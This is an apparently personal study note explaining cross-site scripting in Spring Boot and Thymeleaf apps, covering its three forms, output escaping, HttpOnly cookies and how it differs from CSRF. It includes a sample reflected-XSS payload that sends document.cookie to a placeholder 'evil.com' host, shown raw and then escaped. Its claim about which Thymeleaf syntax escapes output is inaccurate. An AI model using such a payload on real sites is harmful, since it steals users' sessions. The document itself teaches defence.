


XSS is a vulnerability where an attacker gets _their_ JavaScript to run inside _your_ page, in your users' browsers, under your site's own trust. The browser has no way to tell the difference between a `<script>` tag you wrote and one an attacker managed to sneak into the page — once it's in the HTML, it executes with the same permissions as everything else on that page: it can read cookies, make requests to your API using the victim's logged-in session, rewrite the DOM, or quietly ship form data somewhere else. The vulnerability isn't really "JavaScript is dangerous" — it's that your server took untrusted input and placed it into an HTML response without checking whether that input itself contained executable markup.

### Where it actually happens

Think back to the response-building code from earlier — a controller takes some value and it ends up in the body sent to the browser. XSS lives exactly at that handoff point, when the value came from a user instead of your own logic:

```java
@GetMapping("/search")
public String search(@RequestParam String query, Model model) {
    model.addAttribute("query", query);
    return "results"; // Thymeleaf template
}
```

If the template renders `query` unescaped:

```html
<p>You searched for: [[${query}]]</p>   <!-- unescaped output -->
```

and someone visits:

```
/search?query=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

the server dutifully drops that literal string into the HTML body. The browser doesn't know it's "attacker text" — it just sees a `<script>` tag in the page and runs it, stealing the cookie of whoever clicked that link. Nothing was hacked in the traditional sense; the server just did exactly what it was told, with data it should have treated as suspect.

### The three shapes XSS comes in

These aren't different bugs — they're the same root cause (unescaped attacker-controlled output) appearing at different points in a request's lifecycle:

- **Reflected XSS** — the payload lives in the request itself (a query parameter, as above) and is echoed straight back in that same response. It only fires if you trick someone into clicking a crafted link.
- **Stored XSS** — the payload gets saved somewhere persistent (a database, a comment field) and then rendered later for _other_ users who never had to click anything malicious. This is the more dangerous shape because it doesn't require social engineering per-victim — it just sits there waiting.
- **DOM-based XSS** — the payload never even touches your server. Client-side JavaScript reads something attacker-controlled (`location.hash`, `document.URL`) and writes it into the page via `innerHTML` or similar, entirely in the browser. Your server-side escaping does nothing here, because the server never saw the dangerous part.

### Why escaping is the actual fix

The fix isn't "reject anything with angle brackets" — legitimate input can contain `<` or `&` for innocent reasons, and blacklisting characters is easy to bypass. The real fix is **context-aware output encoding**: whatever untrusted value you're about to place into HTML gets its special characters converted to their harmless text equivalents right before output, so the browser displays them instead of interpreting them as markup.

```
<   becomes   &lt;
>   becomes   &gt;
"   becomes   &quot;
'   becomes   &#x27;
```

So the dangerous input from before, once escaped, becomes:

```html
<p>You searched for: &lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</p>
```

The browser now renders that literally as visible text on the page — the word "script" in angle brackets, as plain content — instead of executing it. This is exactly why Thymeleaf's `[[${query}]]` is the unsafe form; the escaped equivalent is `th:text="${query}"`, which HTML-escapes automatically:

```html
<p th:text="'You searched for: ' + ${query}"></p>
```

Same data, same template engine — the difference is whether the engine escapes on the way out. Most modern templating engines (Thymeleaf, JSX, Jinja2) escape by default and make you opt into raw/unescaped output explicitly, precisely because the safe behavior should be the one that happens by accident, not the dangerous one.

### Cookies are the usual target, and `HttpOnly` is the direct countermeasure

The reason XSS is treated so seriously rather than as a cosmetic bug is that `document.cookie` is readable by any script running on the page — including an injected one. If your session cookie is sitting there readable, a single successful script injection hands the attacker a working session, no password needed. Spring Boot lets you mark cookies as `HttpOnly`, which makes them invisible to JavaScript entirely — `document.cookie` simply won't include them, even if an XSS injection succeeds:

```java
ResponseCookie cookie = ResponseCookie.from("SESSION", sessionId)
    .httpOnly(true)   // JavaScript cannot read this cookie at all
    .secure(true)     // only sent over HTTPS
    .path("/")
    .build();
```

This doesn't prevent XSS from happening — the attacker's script can still run and mess with the page — but it removes the single most damaging thing that script could normally do.

### A related concept, briefly: CSRF

Worth knowing the name next to XSS because they're easy to confuse: **CSRF (Cross-Site Request Forgery)** is the opposite direction — instead of injecting a script into _your_ page, an attacker gets the victim's browser to send a legitimate-looking request to your server from _another_ site, relying on the browser auto-attaching the victim's existing cookies. XSS is about running code in your page; CSRF is about forging a request that looks like it came from your page. They're often mentioned together because strong session-cookie handling (`SameSite`, CSRF tokens) defends against one, while output escaping defends against the other — different problems, different fixes, but both rooted in the browser trusting things by default that it probably shouldn't.



[[Spring Security]]
[[Spring Framework]]